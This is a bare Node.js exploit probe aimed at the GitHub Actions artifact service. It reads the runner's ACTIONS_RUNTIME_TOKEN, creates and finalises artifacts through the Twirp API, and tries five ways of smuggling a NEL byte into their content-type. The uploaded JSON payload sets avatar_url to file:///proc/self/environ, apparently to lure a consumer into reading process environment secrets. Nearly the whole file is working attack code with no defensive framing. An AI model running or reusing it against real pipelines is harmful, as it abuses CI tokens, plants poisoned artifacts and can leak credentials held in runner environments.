const crypto = require('node:crypto');
const varint = n => { n = BigInt(n); const o = []; while (n > 0x7fn) { o.push(Number(n & 0x7fn) | 0x80); n >>= 7n; } o.push(Number(n)); return Buffer.from(o); };
const fs = (num, v) => Buffer.concat([varint(num << 3 | 2), varint(v.length), v]);
const fv = (num, v) => Buffer.concat([varint(num << 3), varint(v)]);
const wrap = v => fs(1, v);
const fields = d => { const out = []; let i = 0; const rv = () => { let v = 0n, s = 0n; for (;;) { const b = d[i++]; v |= BigInt(b & 0x7f) << s; if (!(b & 0x80)) return v; s += 7n; } }; while (i < d.length) { const k = rv(); const n = Number(k >> 3n), w = Number(k & 7n); let v; if (w === 0) v = rv(); else if (w === 2) { const l = Number(rv()); v = d.subarray(i, i + l); i += l; } else throw new Error('wire ' + w); out.push([n, w, v]); } return out; };
const payload = Buffer.from(JSON.stringify({ full_name: 'x', owner: { login: 'u', avatar_url: 'file:///proc/self/environ' }, description: '', stargazers_count: 0 }));
const NEL = Buffer.from([0x85]);
const P = Buffer.concat([Buffer.from('application/json'), NEL]);
const PUTF = Buffer.from('application/json\u0085', 'latin1');
const variants = [
  ['a1', [fv(5, 7), fs(6, wrap(P))], 'application/json'],
  ['a2', [fv(5, 7), fs(6, wrap(Buffer.from('application/json\u0085')))], 'application/json'],
  ['a3', [fv(5, 7), fs(6, wrap(Buffer.from('application/json')))], PUTF],
  ['a4', [fv(5, 7)], PUTF],
  ['a5', [fv(5, 7), fs(6, wrap(P))], PUTF],
];
async function post(url, body) {
  return fetch(url, { method: 'POST', headers: { authorization: 'Bearer ' + process.env.ACTIONS_RUNTIME_TOKEN, 'content-type': 'application/protobuf' }, body });
}
(async () => {
  const token = process.env.ACTIONS_RUNTIME_TOKEN;
  const base = process.env.ACTIONS_RESULTS_URL.replace(/\/$/, '');
  const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, runId, jobId] = scope.split(':');
  const svc = 'github.actions.results.api.v1.ArtifactService';
  for (const [label, tail, blobct] of variants) {
    try {
      const name = `${label}-${Date.now()}.json`;
      const req = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), ...tail]);
      const c = await post(`${base}/twirp/${svc}/CreateArtifact`, req);
      const cb = Buffer.from(await c.arrayBuffer());
      if (!c.ok) { console.log('RESULT', label, 'create', c.status, cb.toString().slice(0, 120)); continue; }
      const signed = fields(cb).find(([n, w]) => n === 2 && w === 2)[2].toString();
      const up = await fetch(signed, { method: 'PUT', headers: { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': blobct }, body: payload });
      console.log('RESULT', label, 'upload', up.status, 'ctlen', Buffer.from(blobct, 'latin1').length);
      const digest = 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex');
      const fin = Buffer.concat([fs(1, Buffer.from(runId)), fs(2, Buffer.from(jobId)), fs(3, Buffer.from(name)), fv(4, payload.length), fs(5, wrap(Buffer.from(digest)))]);
      const f = await post(`${base}/twirp/${svc}/FinalizeArtifact`, fin);
      const fb = Buffer.from(await f.arrayBuffer());
      if (!f.ok) { console.log('RESULT', label, 'finalize', f.status, fb.toString().slice(0, 120)); continue; }
      const aid = fields(fb).find(([n, w]) => n === 2 && w === 0)[2].toString();
      console.log('RESULT', label, 'id', aid, 'name', name);
    } catch (e) { console.log('RESULT', label, 'ERR', String(e).slice(0, 160)); }
  }
})().catch(e => { console.error('FATAL', e); process.exitCode = 1; });
